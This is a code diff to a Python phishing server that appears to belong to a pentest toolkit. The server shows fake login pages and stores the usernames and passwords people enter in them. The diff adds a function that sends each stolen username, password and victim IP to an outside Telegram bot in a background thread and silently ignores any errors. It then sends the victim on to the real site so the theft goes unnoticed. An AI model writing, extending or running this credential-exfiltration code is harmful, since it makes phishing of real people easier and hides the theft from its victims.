@@ -16,6 +16,7 @@ import json
 import os
 import ssl
 import urllib.parse
+import urllib.request
 from datetime import datetime
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from typing import AsyncGenerator
@@ -41,6 +42,33 @@ _log_path: str = "/tmp/penkit_phish_creds.json"
 _page_name: str = "google"
 _capture_url: str = "/capture"
 _redirect_url: str = "https://google.com"
+_telegram_token: str = ""
+_telegram_chat_id: str = ""
+
+
+def _send_telegram_alert(entry: dict):
+    """Sendet sofortigen Telegram-Alert wenn Credentials erbeutet werden."""
+    if not _telegram_token or not _telegram_chat_id:
+        return
+    try:
+        msg = (
+            f"🎣 *PHISHING TREFFER!*\n\n"
+            f"🌐 Seite: `{entry.get('page','?')}`\n"
+            f"📍 IP: `{entry.get('ip','?')}`\n"
+            f"👤 User: `{entry.get('username','?')}`\n"
+            f"🔑 Pass: `{entry.get('password','?')}`\n"
+            f"🕐 Zeit: `{entry.get('timestamp','?')[:19]}`"
+        )
+        payload = urllib.parse.urlencode({
+            "chat_id": _telegram_chat_id,
+            "text": msg,
+            "parse_mode": "Markdown",
+        }).encode()
+        url = f"https://api.telegram.org/bot{_telegram_token}/sendMessage"
+        req = urllib.request.Request(url, data=payload)
+        urllib.request.urlopen(req, timeout=5)
+    except Exception:
+        pass
 
 
 class PhishHandler(BaseHTTPRequestHandler):
@@ -104,6 +132,10 @@ class PhishHandler(BaseHTTPRequestHandler):
         print(f"  \033[92m  Password :\033[0m {password}")
         print(f"  \033[92m  Saved to :\033[0m {_log_path}\n")
 
+        # Telegram Alert
+        import threading
+        threading.Thread(target=_send_telegram_alert, args=(entry,), daemon=True).start()
+
         # Redirect to real site (no suspicion)
         self.send_response(302)
         self.send_header("Location", _redirect_url)
@@ -130,19 +162,25 @@ class PhishingServer:
         use_https: bool = False,
         redirect_url: str = "https://google.com",
         output_dir: str = "/tmp",
+        telegram_token: str = "",
+        telegram_chat_id: str = "",
     ):
         self.page = page
         self.port = port
         self.use_https = use_https
         self.redirect_url = redirect_url
         self.output_dir = output_dir
+        self.telegram_token = telegram_token
+        self.telegram_chat_id = telegram_chat_id
 
     async def start(self) -> AsyncGenerator[str, None]:
-        global _page_name, _log_path, _redirect_url, _captured
-        _page_name    = self.page
-        _log_path     = os.path.join(self.output_dir, "penkit_phish_creds.json")
-        _redirect_url = self.redirect_url
-        _captured     = []
+        global _page_name, _log_path, _redirect_url, _captured, _telegram_token, _telegram_chat_id
+        _page_name        = self.page
+        _log_path         = os.path.join(self.output_dir, "penkit_phish_creds.json")
+        _redirect_url     = self.redirect_url
+        _captured         = []
+        _telegram_token   = self.telegram_token
+        _telegram_chat_id = self.telegram_chat_id
 
         proto = "https" if self.use_https else "http"
         yield f"[*] Phishing Server startet..."
